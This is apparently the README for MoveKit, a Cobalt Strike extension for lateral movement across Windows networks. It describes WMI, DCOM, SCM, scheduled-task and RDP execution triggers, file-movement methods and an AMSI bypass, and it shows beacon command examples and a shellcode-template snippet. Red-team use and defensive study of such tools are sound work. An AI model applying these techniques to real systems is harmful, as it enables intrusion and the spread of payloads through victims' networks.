## MoveKit - Cobalt Strike lateral movement kit

Movekit is an extension of built in Cobalt Strike lateral movement by leveraging the execute_assembly function with the SharpMove and SharpRDP .NET assemblies. The aggressor script handles payload creation by reading the template files for a specific execution type. 

IMPORTANT: To use the script a user will only need to load the `MoveKit.cna` aggressor script which will load all the other necessary scripts with it. Additionally, depending on actions taken the [SharpMove](https://github.com/0xthirteen/SharpMove) and [SharpRDP](https://github.com/0xthirteen/SharpRDP) assemblies will need to be compiled and placed into the `Assemblies` directory. Finally, some of the file moving requires dynamic compiling which will require Mono.

When loading the aggressor script there will be a selector loaded to the `menubar` named `Move`. There are multiple selections a user can select. First, users can select to execute a command on a remote system through WMI, DCOM, Task Scheduler, RDP, or SCM. Second, there is the `Command` execution mechanism which uses download cradles to grab and execute the files. Third, the `File` method drops a file on the system and executes it. There is `Write File Only` that does not do any execution, move data only. Finally, there is a `Default` settings to make using GUI faster and used with beacon commands. The default settings are used for anything that can accept a default.

To use the beacon commands it will read the default settings and use a few command line arguments. A beacon command example:
`<exec-type> <target> <listener> <filename>`

`move-msbuild 192.168.1.1 http move.csproj`

Additionally, the custom pre built beacon command is a little bit different. Command example:
`move-pre-custom-file <target> <local-file> <remote-filename>`

`move-pre-custom-file computer001.local /root/payload.exe legit.exe`


The location field is the trickiest part of the project. When selecting `WMI` file movement `location` will be used, if SMB is selected then it will not be used (so it can be left empty). `Location` takes three different values. First, it `location` is a URL then when the payload is created it will be hosted by Cobalt Strike's web server. The beacon host where the assembly will be executed from will make a web request to the URL and grab the file, which will be used in an event sub on the target host to write the file. Second, if `location` is a Windows directory then it will upload the created file to the beacon host and the assembly will read it from the file system and store in the event sub to write to the remote host. Finally, if the `location` field is a linux path or the word `local` then it will dynamically compile the payload into the assembly being executed. However, if the file is above the 1MB file size limit then it will show an error. 

For all file methods the payload will be created through the aggressor script. However, if a payload is already created users can select to use the `Custom (Prebuilt)` option to move and execute it. 

The kit contains different file movement techniques, execution triggers, and payload types.

File movement is considered the method used for getting a file to a remote host
File movement types:
  * SMB to flat file
  * WMI to flat file
  * WMI to Registry Key Value
  * WMI to Custom WMI Class property

Command trigger is considered the method used for executing a specific command on a remote host.
Command trigger types:
  * WMI
  * SCM
  * RDP
  * DCOM (Multiple)
  * Scheduled Tasks
  * Modify Scheduled Task (Existing Task has action updated, executes task and resets action)
  * Modify Service binpath (Existing Service has binpath updated, service is started and reset back to original state)

Shellcode only execution:
  * Excel 4.0 DCOM
  * WMI Event Subscription (coming soon)

Hijacks:
  * Service DLL Hijack (coming soon)
  * DCOM Server Hijack (coming soon)


#### Dependencies
  * Mono (MCS) for compiling .NET assemblies (Used with dynamic payload creation, InstallUtil, and Custom-NonPreBuilt). Also when FileWrite Assembly is used. 

#### Gotchas:
* Sometimes execute_assembly will be called before file movement, if this happens you can execute the payload by unchecking the *Auto* check box
* The kit does not automatically clean up files, it is left up to the operator

##### Note: It is recommended not using the default templates with the project.

To replace a template you must meet two requirements. First, the template must be named the technique (example: `msbuild.csproj`). Second, the source code must contain the string `$$PAYLOAD$$` where base64 encoded shellcode will go and be able to convert a base64 string to a byte array. Example for C#:
```
string strSC = "$$PAYLOAD$$";
byte[] sc = Convert.FromBase64String(strSC);
```

A change was added that allows for the defaults to update the 'Find and Replace string' and the shellcode formats in the 'Update Defaults dialog'. By default these are `$$PAYLOAD$$` and base64.

#### Operational considerations

  * If using task scheduler scheduled tasks will be created and deleted
  * If using SCM services will be created and deleted
  * If using the AMSI bypass it will only work for WSH not PowerShell
  * If using the AMSI bypass it will modify the registry by either updating or creating a registry key then setting it back to its original value or deleting
  * It uses Cobalt Strike's `execute-assembly` function so it will inject into a sacrificial process like other post ex jobs
  * Files will be dropped on disk if using any of the `File` or `Command` methods
  * Templates should not be used, they are all public
  * All of the techniques are not new and are pretty well known


#### Credits

  Some of the code, templates or inspiration comes from other people and projects
  * WMI - [SharpWMI](https://github.com/GhostPack/SharpWMI) by [harmj0y](https://twitter.com/harmj0y)
  * DCOM - [SharpCOM](https://github.com/rvrsh3ll/SharpCOM) by [rvrsh3ll](https://twitter.com/424f424f) and [SharpSploit DCOM](https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/LateralMovement/DCOM.cs) by [cobbr](https://twitter.com/cobbr_io)
  * SCM - [CSExec](https://github.com/malcomvetter/CSExec) by [Tim Malcomvetter](https://twitter.com/malcomvetter)
  * Service DLL Hijack [SharpSC](https://github.com/djhohnstein/SharpSC) by [djhohnstein](https://twitter.com/djhohnstein)
  * Service binpath modifcation [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) by [Mr-Un1k0d3r](https://twitter.com/MrUn1k0d3r)
  * [Shellcode runner template](https://github.com/Arno0x/CSharpScripts/blob/master/shellcodeLauncher.cs) by [subTee](https://twitter.com/subTee)
  * [CACTUSTORCH payloads](https://github.com/vysecurity/CACTUSTORCH) by [vysecurity](https://twitter.com/vysecurity)


_There are probably bugs somewhere, they tend to come up from time to time. Just bring them up and I'll fix them_